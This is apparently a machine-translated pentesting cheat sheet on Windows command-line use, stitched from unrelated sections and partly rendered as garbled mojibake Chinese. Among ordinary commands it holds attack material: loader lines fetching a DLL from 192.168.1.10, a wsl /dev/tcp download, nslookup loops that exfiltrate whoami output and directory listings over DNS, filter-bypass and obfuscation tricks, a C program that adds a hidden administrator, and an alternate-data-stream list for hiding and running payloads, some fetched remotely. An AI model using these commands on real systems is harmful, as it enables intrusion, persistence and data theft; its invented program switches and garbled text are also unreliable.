The `systeminfo` command displays detailed information about the system, including the operating system version, hardware configuration, and installed software. This can be useful for identifying vulnerabilities or outdated software.

```plaintext
systeminfo
```

### 6. Reg

The `reg` command is used to manage the Windows Registry. Some useful subcommands include:

- `reg query` - Displays the values and subkeys of a specified registry key.
- `reg add` - Adds a new registry key or value.
- `reg delete` - Deletes a specified registry key or value.

```plaintext
reg query HKLM\Software
reg add HKCU\Software\NewKey
reg delete HKLM\Software\OldKey
```

### 7. Taskkill

The `taskkill` command is used to terminate a running process. It can be useful for stopping any malicious processes or unwanted applications.

```plaintext
taskkill /IM process_name.exe /F
```

### 8. Schtasks

The `schtasks` command is used to manage scheduled tasks on the system. It can be used to create, modify, or delete scheduled tasks.

```plaintext
schtasks /Create /SC DAILY /TN "TaskName" /TR "C:\path\to\executable.exe" /ST 12:00
schtasks /Change /TN "TaskName" /RU "SYSTEM"
schtasks /Delete /TN "TaskName"
```

### 9. Cipher

The `cipher` command is used to manage file encryption on NTFS volumes. It can be used to encrypt or decrypt files and folders.

```plaintext
cipher /E /S:C:\path\to\folder
cipher /D /S:C:\path\to\folder
```

### 10. Eventvwr

The `eventvwr` command opens the Event Viewer, which displays logs and events recorded by the system. It can be used to analyze system events and identify any suspicious activities.

```plaintext
eventvwr
```

## Conclusion

These basic CMD commands can be helpful for pentesters during their engagements. However, it is important to note that these commands should be used responsibly and in accordance with legal and ethical guidelines.
```
Excel.exe http://192.168.1.10/TeamsAddinLoader.dll
```
# Powerpnt.exe

Powerpnt.exe is the executable file for Microsoft PowerPoint, a popular presentation software. It is commonly found on Windows operating systems.

## Usage

To launch PowerPoint using the command prompt, you can use the following command:

```
powerpnt.exe
```

This will open the PowerPoint application, allowing you to create, edit, and present slideshows.

## Command Line Options

Powerpnt.exe supports various command line options that can be used to perform specific tasks. Here are some commonly used options:

- `/s` - Starts PowerPoint in slideshow mode.
- `/n` - Starts a new instance of PowerPoint.
- `/f <filename>` - Opens the specified file in PowerPoint.
- `/m <macro>` - Runs the specified macro when PowerPoint starts.
- `/pt <printername>` - Prints the specified file to the specified printer.
- `/p <filename>` - Prints the specified file without opening PowerPoint.

## Example

To open a PowerPoint file named "presentation.pptx" using the command prompt, you can use the following command:

```
powerpnt.exe /f presentation.pptx
```

This will open the "presentation.pptx" file in PowerPoint.

## Conclusion

Powerpnt.exe is a useful tool for working with PowerPoint files from the command line. By understanding its command line options, you can automate tasks and perform operations more efficiently.
```
Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"
```
# Squirrel.exe

Squirrel.exe is a command-line utility that allows you to interact with the Squirrel framework. It is commonly used by developers to manage and deploy applications built with Squirrel.

## Usage

To use Squirrel.exe, open a command prompt and navigate to the directory where the executable is located. Then, you can run various commands to perform different actions.

### Install

The `install` command is used to install an application. It takes the path to the application package as an argument.

```shell
squirrel.exe install <path_to_package>
```

### Update

The `update` command is used to update an installed application. It takes the path to the updated application package as an argument.

```shell
squirrel.exe update <path_to_package>
```

### Uninstall

The `uninstall` command is used to uninstall an application. It takes the application name as an argument.

```shell
squirrel.exe uninstall <application_name>
```

### Other Commands

Squirrel.exe also provides other commands for managing applications, such as `list`, `releasify`, and `clean`. You can use the `--help` flag with any command to get more information about its usage.

## Conclusion

Squirrel.exe is a powerful command-line utility for managing applications built with the Squirrel framework. By using the various commands provided, you can easily install, update, and uninstall applications, making it a valuable tool for developers.
```
squirrel.exe --download [url to package]
```
# Update.exe

`Update.exe` is a common executable file found in Windows operating systems. It is used to update various software and system components. However, it can also be leveraged by attackers for malicious purposes.

## Malicious Use

Attackers can disguise malware or malicious scripts as `Update.exe` to trick users into running them. This can be done through various methods, such as phishing emails, compromised websites, or social engineering techniques.

Once executed, the malicious `Update.exe` can perform a wide range of actions, including:

- Installing additional malware or backdoors on the system.
- Modifying system settings or configurations.
- Stealing sensitive information, such as login credentials or personal data.
- Initiating unauthorized network connections.
- Exploiting vulnerabilities in the system or other software.

## Prevention and Mitigation

To protect against malicious `Update.exe` files, consider the following preventive measures:

1. **Exercise caution**: Be wary of downloading or running any files named `Update.exe` from untrusted sources.
2. **Keep software up to date**: Regularly update your operating system and software applications to patch any vulnerabilities that could be exploited by attackers.
3. **Use reliable security software**: Install and maintain reputable antivirus and anti-malware software to detect and block malicious files.
4. **Enable firewalls**: Enable and configure firewalls to monitor and control incoming and outgoing network traffic.
5. **Educate users**: Train users to be cautious when downloading files or clicking on links, especially from unknown or suspicious sources.

By following these preventive measures, you can reduce the risk of falling victim to malicious `Update.exe` files and protect your system from potential attacks.
```
Update.exe --download [url to package]
```
# Basic CMD for Pentesters

## Winword.exe

`winword.exe` is the executable file for Microsoft Word, a popular word processing program. It is commonly found on Windows operating systems.

### Execution

To execute `winword.exe`, you can simply type `winword` in the command prompt and press Enter. This will launch the Microsoft Word application.

```
winword
```

### Command Line Arguments

`winword.exe` supports various command line arguments that can be used to perform specific actions or tasks. Here are some commonly used arguments:

- `/n` - Opens a new instance of Microsoft Word.
- `/t` - Opens a specified file.
- `/m` - Executes a specific macro or command.
- `/q` - Starts Word without displaying the splash screen.

To use these arguments, you can append them to the `winword` command. For example, to open a specific file, you can use the `/t` argument followed by the file path:

```
winword /t C:\path\to\file.docx
```

### Additional Information

- `winword.exe` is typically located in the `C:\Program Files\Microsoft Office\root\OfficeXX` directory, where `XX` represents the version number of Microsoft Office installed on the system.
- It is important to note that `winword.exe` can be used as a vector for malicious activities, such as executing macros or launching exploits. Therefore, it is crucial to ensure the security of Microsoft Word and its associated files.
```
winword.exe "http://192.168.1.10/TeamsAddinLoader.dll"
```
# Wsl.exe

`wsl.exe` æ˜¯ Windows Subsystem for Linux (WSL) çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚WSL æ˜¯ä¸€ç§å…è®¸åœ¨ Windows æ“ä½œç³»ç»Ÿä¸Šè¿è¡Œ Linux å‘è¡Œç‰ˆçš„å…¼å®¹å±‚ã€‚é€šè¿‡è¿è¡Œ `wsl.exe`ï¼Œç”¨æˆ·å¯ä»¥åœ¨ Windows ç¯å¢ƒä¸­è®¿é—®å’Œä½¿ç”¨ Linux å‘½ä»¤è¡Œå·¥å…·å’Œåº”ç”¨ç¨‹åºã€‚

## ç”¨æ³•

è¦åœ¨ Windows ä¸Šè¿è¡Œ WSLï¼Œè¯·æŒ‰ä¸‹ `Win + R` ç»„åˆé”®æ‰“å¼€è¿è¡Œå¯¹è¯æ¡†ï¼Œç„¶åè¾“å…¥ `wsl` å¹¶æŒ‰ä¸‹å›è½¦é”®ã€‚è¿™å°†å¯åŠ¨é»˜è®¤çš„ Linux å‘è¡Œç‰ˆã€‚

å¦‚æœä½ æƒ³è¿è¡Œç‰¹å®šçš„ Linux å‘è¡Œç‰ˆï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```plaintext
wsl -d <distribution>
```

å…¶ä¸­ `<distribution>` æ˜¯ä½ æƒ³è¦è¿è¡Œçš„ Linux å‘è¡Œç‰ˆçš„åç§°ã€‚

## ç¤ºä¾‹

ä»¥ä¸‹æ˜¯ä¸€äº›ä½¿ç”¨ `wsl.exe` çš„ç¤ºä¾‹ï¼š

- è¿è¡Œé»˜è®¤çš„ Linux å‘è¡Œç‰ˆï¼š

  ```plaintext
  wsl
  ```

- è¿è¡Œ Ubuntu å‘è¡Œç‰ˆï¼š

  ```plaintext
  wsl -d Ubuntu
  ```

- è¿è¡Œ Kali Linux å‘è¡Œç‰ˆï¼š

  ```plaintext
  wsl -d Kali
  ```

è¯·æ³¨æ„ï¼Œ`wsl.exe` åªèƒ½åœ¨æ”¯æŒ WSL çš„ Windows ç‰ˆæœ¬ä¸Šè¿è¡Œã€‚
```
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
```
## å…¶ä»–

### Basic CMD commands for pentesters

### æ¸—é€æµ‹è¯•äººå‘˜çš„åŸºæœ¬CMDå‘½ä»¤

Here you have a list of basic CMD commands that can be useful during a penetration test.

è¿™é‡Œæœ‰ä¸€äº›åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­å¯èƒ½æœ‰ç”¨çš„åŸºæœ¬CMDå‘½ä»¤åˆ—è¡¨ã€‚

### Networking

### ç½‘ç»œ

#### ipconfig

#### ipconfig

Displays the IP configuration for all network interfaces on the machine.

æ˜¾ç¤ºæœºå™¨ä¸Šæ‰€æœ‰ç½‘ç»œæ¥å£çš„IPé…ç½®ã€‚

```plaintext
ipconfig
```

#### netstat

#### netstat

Displays active network connections and listening ports.

æ˜¾ç¤ºæ´»åŠ¨çš„ç½‘ç»œè¿æ¥å’Œç›‘å¬ç«¯å£ã€‚

```plaintext
netstat -ano
```

#### nslookup

#### nslookup

Performs DNS lookup on a specified domain or IP address.

å¯¹æŒ‡å®šçš„åŸŸåæˆ–IPåœ°å€æ‰§è¡ŒDNSæŸ¥æ‰¾ã€‚

```plaintext
nslookup google.com
```

#### ping

#### ping

Sends ICMP Echo Request packets to a specified IP address or domain.

å‘æŒ‡å®šçš„IPåœ°å€æˆ–åŸŸåå‘é€ICMP Echoè¯·æ±‚æ•°æ®åŒ…ã€‚

```plaintext
ping google.com
```

#### tracert

#### tracert

Traces the route that packets take to reach a specified IP address or domain.

è·Ÿè¸ªæ•°æ®åŒ…åˆ°è¾¾æŒ‡å®šçš„IPåœ°å€æˆ–åŸŸåçš„è·¯å¾„ã€‚

```plaintext
tracert google.com
```

### System Information

### ç³»ç»Ÿä¿¡æ¯

#### systeminfo

#### systeminfo

Displays detailed configuration information about the machine's hardware and software.

æ˜¾ç¤ºæœ‰å…³æœºå™¨ç¡¬ä»¶å’Œè½¯ä»¶çš„è¯¦ç»†é…ç½®ä¿¡æ¯ã€‚

```plaintext
systeminfo
```

#### tasklist

#### tasklist

Displays a list of currently running processes on the machine.

æ˜¾ç¤ºæœºå™¨ä¸Šå½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹åˆ—è¡¨ã€‚

```plaintext
tasklist
```

#### net user

#### net user

Displays a list of user accounts on the machine.

æ˜¾ç¤ºæœºå™¨ä¸Šçš„ç”¨æˆ·è´¦æˆ·åˆ—è¡¨ã€‚

```plaintext
net user
```

#### net localgroup

#### net localgroup

Displays a list of local groups on the machine.

æ˜¾ç¤ºæœºå™¨ä¸Šçš„æœ¬åœ°ç»„åˆ—è¡¨ã€‚

```plaintext
net localgroup
```

### File and Directory Operations

### æ–‡ä»¶å’Œç›®å½•æ“ä½œ

#### dir

#### dir

Lists the files and directories in the current directory.

åˆ—å‡ºå½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ã€‚

```plaintext
dir
```

#### cd

#### cd

Changes the current directory.

æ›´æ”¹å½“å‰ç›®å½•ã€‚

```plaintext
cd C:\Windows
```

#### copy

#### copy

Copies one or more files from one location to another.

ä»ä¸€ä¸ªä½ç½®å¤åˆ¶ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶åˆ°å¦ä¸€ä¸ªä½ç½®ã€‚

```plaintext
copy file.txt C:\Temp
```

#### move

#### move

Moves one or more files from one location to another.

ä»ä¸€ä¸ªä½ç½®ç§»åŠ¨ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶åˆ°å¦ä¸€ä¸ªä½ç½®ã€‚

```plaintext
move file.txt C:\Temp
```

#### del

#### del

Deletes one or more files.

åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ã€‚

```plaintext
del file.txt
```

### User and Group Management

### ç”¨æˆ·å’Œç»„ç®¡ç†

#### net user

#### net user

Creates, modifies, or deletes user accounts.

åˆ›å»ºã€ä¿®æ”¹æˆ–åˆ é™¤ç”¨æˆ·è´¦æˆ·ã€‚

```plaintext
net user hacker password123 /add
```

#### net localgroup

#### net localgroup

Creates, modifies, or deletes local groups.

åˆ›å»ºã€ä¿®æ”¹æˆ–åˆ é™¤æœ¬åœ°ç»„ã€‚

```plaintext
net localgroup administrators hacker /add
```

#### net group

#### net group

Displays or modifies global groups.

æ˜¾ç¤ºæˆ–ä¿®æ”¹å…¨å±€ç»„ã€‚

```plaintext
net group administrators
```

### Service Management

### æœåŠ¡ç®¡ç†

#### sc

#### sc

Manages services on the machine.

ç®¡ç†æœºå™¨ä¸Šçš„æœåŠ¡ã€‚

```plaintext
sc query
```

```plaintext
sc start servicename
```

```plaintext
sc stop servicename
```

### Registry Operations

### æ³¨å†Œè¡¨æ“ä½œ

#### reg query

#### reg query

Displays the values and subkeys of a specified registry key.

æ˜¾ç¤ºæŒ‡å®šæ³¨å†Œè¡¨é”®çš„å€¼å’Œå­é”®ã€‚

```plaintext
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion
```

#### reg add

#### reg add

Adds a new registry key or modifies an existing registry key.

æ·»åŠ æ–°çš„æ³¨å†Œè¡¨é”®æˆ–ä¿®æ”¹ç°æœ‰çš„æ³¨å†Œè¡¨é”®ã€‚

```plaintext
reg add HKEY_LOCAL_MACHINE\Software\NewKey
```

#### reg delete

#### reg delete

Deletes a registry key and its subkeys.

åˆ é™¤æ³¨å†Œè¡¨é”®åŠå…¶å­é”®ã€‚

```plaintext
reg delete HKEY_LOCAL_MACHINE\Software\NewKey
```

### Task Scheduler

### ä»»åŠ¡è®¡åˆ’ç¨‹åº

#### schtasks

#### schtasks

Manages scheduled tasks on the machine.

ç®¡ç†æœºå™¨ä¸Šçš„è®¡åˆ’ä»»åŠ¡ã€‚

```plaintext
schtasks /query
```

```plaintext
schtasks /create /tn "TaskName" /tr "C:\Temp\script.bat" /sc DAILY /st 12:00
```

```plaintext
schtasks /delete /tn "TaskName"
```

### Event Viewer

### äº‹ä»¶æŸ¥çœ‹å™¨

#### eventvwr

#### eventvwr

Opens the Event Viewer, which displays detailed information about system events.

æ‰“å¼€äº‹ä»¶æŸ¥çœ‹å™¨ï¼Œæ˜¾ç¤ºæœ‰å…³ç³»ç»Ÿäº‹ä»¶çš„è¯¦ç»†ä¿¡æ¯ã€‚

```plaintext
eventvwr
```

### Conclusion

### ç»“è®º

These are just a few of the many CMD commands available for Windows. Understanding and utilizing these commands can greatly enhance your effectiveness as a pentester.

è¿™äº›åªæ˜¯Windowsä¸Šä¼—å¤šCMDå‘½ä»¤ä¸­çš„ä¸€éƒ¨åˆ†ã€‚ç†è§£å’Œåˆ©ç”¨è¿™äº›å‘½ä»¤å¯ä»¥æå¤§åœ°æé«˜æ‚¨ä½œä¸ºæ¸—é€æµ‹è¯•äººå‘˜çš„æ•ˆç‡ã€‚
```bash
cd #Get current dir
cd C:\path\to\dir #Change dir
dir #List current dir
dir /a:h C:\path\to\dir #List hidden files
dir /s /b #Recursive list without shit
time #Get current time
date #Get current date
shutdown /r /t 0 #Shutdown now
type <file> #Cat file

#Runas
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe" #Use saved credentials
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Hide
attrib +h file #Set Hidden
attrib -h file #Quit Hidden

#Give full control over a file that you owns
icacls <FILE_PATH> /t /e /p <USERNAME>:F
icacls <FILE_PATH> /e /r <USERNAME> #Remove the permision

#Recursive copy to smb
xcopy /hievry C:\Users\security\.yawcam \\10.10.14.13\name\win

#exe2bat to transform exe file in bat file

#ADS
dir /r #Detect ADS
more file.txt:ads.txt #read ADS
powershell (Get-Content file.txt -Stream ads.txt)

# Get error messages from code
net helpmsg 32 #32 is the code in that case
```
### ç»•è¿‡å­—ç¬¦é»‘åå•

In some cases, when attempting to execute commands on a target system, certain characters may be blacklisted or filtered out. This can make it difficult to execute commands that contain these restricted characters. However, there are several techniques that can be used to bypass character blacklisting and successfully execute commands.

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåœ¨å°è¯•åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤æ—¶ï¼ŒæŸäº›å­—ç¬¦å¯èƒ½ä¼šè¢«åˆ—å…¥é»‘åå•æˆ–è¿‡æ»¤æ‰ã€‚è¿™å¯èƒ½ä¼šä½¿åŒ…å«è¿™äº›å—é™å­—ç¬¦çš„å‘½ä»¤éš¾ä»¥æ‰§è¡Œã€‚ç„¶è€Œï¼Œæœ‰å‡ ç§æŠ€æœ¯å¯ä»¥ç”¨æ¥ç»•è¿‡å­—ç¬¦é»‘åå•å¹¶æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚

#### 1. Character Substitution

One method to bypass character blacklisting is to substitute restricted characters with similar-looking characters that are not blacklisted. For example, if the character `;` is blacklisted, it can be replaced with a similar-looking character like `Í¾` (Greek question mark). This can trick the system into accepting the command without triggering the blacklist.

#### 1. å­—ç¬¦æ›¿æ¢

ç»•è¿‡å­—ç¬¦é»‘åå•çš„ä¸€ç§æ–¹æ³•æ˜¯ç”¨çœ‹èµ·æ¥ç›¸ä¼¼ä½†ä¸åœ¨é»‘åå•ä¸­çš„å­—ç¬¦æ›¿æ¢å—é™å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå­—ç¬¦ `;` è¢«åˆ—å…¥é»‘åå•ï¼Œå¯ä»¥ç”¨ç±»ä¼¼çš„å­—ç¬¦ `Í¾`ï¼ˆå¸Œè…Šé—®å·ï¼‰æ›¿æ¢å®ƒã€‚è¿™å¯ä»¥æ¬ºéª—ç³»ç»Ÿæ¥å—å‘½ä»¤è€Œä¸è§¦å‘é»‘åå•ã€‚

#### 2. Unicode Encoding

Another technique is to use Unicode encoding to represent restricted characters. This involves converting the restricted character into its Unicode representation and using that in the command. For example, the character `;` can be represented as `%u003B` in Unicode. This can bypass the blacklist as the system may not recognize the Unicode representation as the restricted character.

#### 2. Unicode ç¼–ç 

å¦ä¸€ç§æŠ€æœ¯æ˜¯ä½¿ç”¨ Unicode ç¼–ç æ¥è¡¨ç¤ºå—é™å­—ç¬¦ã€‚è¿™æ¶‰åŠå°†å—é™å­—ç¬¦è½¬æ¢ä¸ºå…¶ Unicode è¡¨ç¤ºï¼Œå¹¶åœ¨å‘½ä»¤ä¸­ä½¿ç”¨è¯¥è¡¨ç¤ºã€‚ä¾‹å¦‚ï¼Œå­—ç¬¦ `;` å¯ä»¥ç”¨ Unicode è¡¨ç¤ºä¸º `%u003B`ã€‚è¿™å¯ä»¥ç»•è¿‡é»‘åå•ï¼Œå› ä¸ºç³»ç»Ÿå¯èƒ½æ— æ³•å°† Unicode è¡¨ç¤ºè¯†åˆ«ä¸ºå—é™å­—ç¬¦ã€‚

#### 3. Command Concatenation

If certain characters are blacklisted individually but allowed when combined with other characters, command concatenation can be used. This involves breaking the command into multiple parts and concatenating them using allowed characters. For example, if the characters `&` and `;` are blacklisted individually, but allowed when combined as `&;`, the command can be split into two parts and concatenated using `&;` to bypass the blacklist.

#### 3. å‘½ä»¤è¿æ¥

å¦‚æœæŸäº›å­—ç¬¦åœ¨å•ç‹¬ä½¿ç”¨æ—¶è¢«åˆ—å…¥é»‘åå•ï¼Œä½†ä¸å…¶ä»–å­—ç¬¦ç»„åˆæ—¶å…è®¸ä½¿ç”¨ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤è¿æ¥ã€‚è¿™æ¶‰åŠå°†å‘½ä»¤åˆ†æˆå¤šä¸ªéƒ¨åˆ†ï¼Œå¹¶ä½¿ç”¨å…è®¸çš„å­—ç¬¦è¿›è¡Œè¿æ¥ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå­—ç¬¦ `&` å’Œ `;` åœ¨å•ç‹¬ä½¿ç”¨æ—¶è¢«åˆ—å…¥é»‘åå•ï¼Œä½†åœ¨ç»„åˆä¸º `&;` æ—¶å…è®¸ä½¿ç”¨ï¼Œå¯ä»¥å°†å‘½ä»¤åˆ†æˆä¸¤éƒ¨åˆ†ï¼Œå¹¶ä½¿ç”¨ `&;` è¿›è¡Œè¿æ¥ä»¥ç»•è¿‡é»‘åå•ã€‚

By employing these techniques, it is possible to bypass character blacklisting and successfully execute commands on a target system. However, it is important to note that these techniques may not work in all scenarios, as the effectiveness of character blacklisting varies depending on the specific implementation and configuration of the target system.

é€šè¿‡ä½¿ç”¨è¿™äº›æŠ€æœ¯ï¼Œå¯ä»¥ç»•è¿‡å­—ç¬¦é»‘åå•å¹¶æˆåŠŸåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚ç„¶è€Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™äº›æŠ€æœ¯å¯èƒ½åœ¨æ‰€æœ‰æƒ…å†µä¸‹éƒ½ä¸èµ·ä½œç”¨ï¼Œå› ä¸ºå­—ç¬¦é»‘åå•çš„æœ‰æ•ˆæ€§å–å†³äºç›®æ ‡ç³»ç»Ÿçš„å…·ä½“å®ç°å’Œé…ç½®ã€‚
```bash
echo %HOMEPATH:~6,-11%   #\
who^ami   #whoami
```
### DOSfuscation

ç”Ÿæˆä¸€ä¸ªæ··æ·†çš„CMDå‘½ä»¤è¡Œ
```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
SET COMMAND type C:\Users\Administrator\Desktop\flag.txt
encoding
```
### ç›‘å¬åœ°å€è®¿é—®æ§åˆ¶åˆ—è¡¨

æ‚¨å¯ä»¥åœ¨æ²¡æœ‰ç®¡ç†å‘˜æƒé™çš„æƒ…å†µä¸‹ç›‘å¬ [http://+:80/Temporary\_Listen\_Addresses/](http://+/Temporary\_Listen\_Addresses/)ã€‚
```bash
netsh http show urlacl
```
### æ‰‹åŠ¨DNS shell

**æ”»å‡»è€…**ï¼ˆKaliï¼‰å¿…é¡»ä½¿ç”¨ä»¥ä¸‹ä¸¤ä¸ªé€‰é¡¹ä¹‹ä¸€ï¼š
```bash
sudo responder -I <iface> #Active
sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive
```
#### å—å®³è€…

_**for /f tokens**_ \_\*\*\_æŠ€æœ¯ï¼šè¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤ï¼Œè·å–æ¯è¡Œçš„å‰Xä¸ªå•è¯ï¼Œå¹¶å°†å…¶é€šè¿‡DNSå‘é€åˆ°æˆ‘ä»¬çš„æœåŠ¡å™¨
```
for /f %a in ('whoami') do nslookup %a <IP_kali> #Get whoami
for /f "tokens=2" %a in ('echo word1 word2') do nslookup %a <IP_kali> #Get word2
for /f "tokens=1,2,3" %a in ('dir /B C:\') do nslookup %a.%b.%c <IP_kali> #List folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c <IP_kali> #List that folder
for /f "tokens=1,2,3" %a in ('dir /B "C:\Progra~2"') do nslookup %a.%b.%c <IP_kali> #Same as last one
#More complex commands
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('whoami /priv ^| findstr /i "enable"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali> #Same as last one
```
æ‚¨è¿˜å¯ä»¥**é‡å®šå‘**è¾“å‡ºï¼Œç„¶å**è¯»å–**å®ƒã€‚
```
whoami /priv | finstr "Enab" > C:\Users\Public\Documents\out.txt
for /f "tokens=1,2,3,4,5,6,7,8,9" %a in ('type "C:\Users\Public\Documents\out.txt"') do nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i <IP_kali>
```
## ä»Cä»£ç ä¸­è°ƒç”¨CMD

To call CMD from C code, you can use the `system()` function provided by the C standard library. This function allows you to execute a command in the command prompt.

Here is an example of how to call CMD from C code:

```c
#include <stdlib.h>

int main() {
    // Command to be executed
    char command[] = "dir";

    // Calling CMD using system() function
    system(command);

    return 0;
}
```

In the above example, the `system()` function is used to execute the `dir` command, which lists the files and directories in the current directory. You can replace `dir` with any other CMD command you want to execute.

To compile and run the above code, you can use a C compiler such as GCC. Save the code in a file with a `.c` extension (e.g., `call_cmd.c`), and then compile it using the following command:

```bash
gcc call_cmd.c -o call_cmd
```

After compiling, you can run the program by executing the generated executable file:

```bash
./call_cmd
```

This will call CMD and execute the specified command. The output of the command will be displayed in the command prompt.
```c
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */

// When executed by Administrator this program will create a user and then add him to the administrators group
// i686-w64-mingw32-gcc addmin.c -o addmin.exe
// upx -9 addmin.exe

int main (){
int i;
i=system("net users otherAcc 0TherAcc! /add");
i=system("net localgroup administrators otherAcc /add");
return 0;
}
```
## å¤‡ç”¨æ•°æ®æµé€ŸæŸ¥è¡¨ï¼ˆADS/å¤‡ç”¨æ•°æ®æµï¼‰

æ¥è‡ª[https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)
```bash
##Add content to ADS###
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
findstr /V /L W3AllLov3DonaldTrump c:\ADS\procexp.exe > c:\ADS\file.txt:procexp.exe
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\temp:ttt
makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab
print /D:c:\ads\file.txt:autoruns.exe c:\ads\Autoruns.exe
reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ads\file.txt:evilreg.reg
regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
esentutl.exe /y C:\ADS\autoruns.exe /d c:\ADS\file.txt:autoruns.exe /o
powershell -command " & {(Get-Content C:\ADS\file.exe -Raw | Set-Content C:\ADS\file.txt -Stream file.exe)}"
curl file://c:/temp/autoruns.exe --output c:\temp\textfile1.txt:auto.exe
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://evilsite.com/RegSvr32.sct   ^scrobj.dll > fakefile.doc:reg32.bat
set-content - path {path to the file} - stream {name of the stream}

## Discover ADS contecnt
dir /R
streams.exe <c:\path\to\file> #Binary from sysinternals#
Get-Item -Path .\fie.txt -Stream *
gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data'

##Extract content from ADS###
expand c:\ads\file.txt:test.exe c:\temp\evil.exe
esentutl.exe /Y C:\temp\file.txt:test.exe /d c:\temp\evil.exe /o
more < c:\ads\file.txt:test.exe

##Executing the ADS content###

* WMIC
wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'

* Rundll32
rundll32 "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:ADSDLL.dll",DllMain
rundll32.exe advpack.dll,RegisterOCX not_a_dll.txt:test.dll
rundll32.exe ieadvpack.dll,RegisterOCX not_a_dll.txt:test.dll

* Cscript
cscript "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Script.vbs"

* Wscript
wscript c:\ads\file.txt:script.vbs
echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js

* Forfiles
forfiles /p c:\windows\system32 /m notepad.exe /c "c:\temp\shellloader.dll:bginfo.exe"

* Mavinject.exe
c:\windows\SysWOW64\notepad.exe
tasklist | findstr notepad
notepad.exe                   4172 31C5CE94259D4006           2     18,476 K
type c:\temp\AtomicTest.dll > "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"
c:\windows\WinSxS\wow64_microsoft-windows-appmanagement-appvwow_31bf3856ad364e35_10.0.16299.15_none_e07aa28c97ebfa48\mavinject.exe 4172 /INJECTRUNNING "c:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:Atomic.dll"

* MSHTA
mshta "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log:helloworld.hta"
(Does not work on Windows 10 1903 and newer)

* Control.exe
control.exe c:\windows\tasks\zzz:notepad_reflective_x64.dll
https://twitter.com/bohops/status/954466315913310209

* Create service and run
sc create evilservice binPath= "\"c:\ADS\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto
sc start evilservice
https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/

* Powershell.exe
powershell -ep bypass - < c:\temp:ttt

* Powershell.exe
powershell -command " & {(Get-Content C:\ADS\1.txt -Stream file.exe -Raw | Set-Content c:\ADS\file.exe) | start-process c:\ADS\file.exe}"

* Powershell.exe
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = C:\ads\folder:file.exe}

* Regedit.exe
regedit c:\ads\file.txt:regfile.reg

* Bitsadmin.exe
bitsadmin /create myfile
bitsadmin /addfile myfile c:\windows\system32\notepad.exe c:\data\playfolder\notepad.exe
bitsadmin /SetNotifyCmdLine myfile c:\ADS\1.txt:cmd.exe NULL
bitsadmin /RESUME myfile

* AppVLP.exe
AppVLP.exe c:\windows\tracing\test.txt:ha.exe

* Cmd.exe
cmd.exe - < fakefile.doc:reg32.bat
https://twitter.com/yeyint_mth/status/1143824979139579904

* Ftp.exe
ftp -s:fakefile.txt:aaaa.txt
https://github.com/sailay1996/misc-bin/blob/master/ads.md

* ieframe.dll , shdocvw.dll (ads)
echo [internetshortcut] > fake.txt:test.txt && echo url=C:\windows\system32\calc.exe >> fake.txt:test.txt rundll32.exe ieframe.dll,OpenURL C:\temp\ads\fake.txt:test.txt
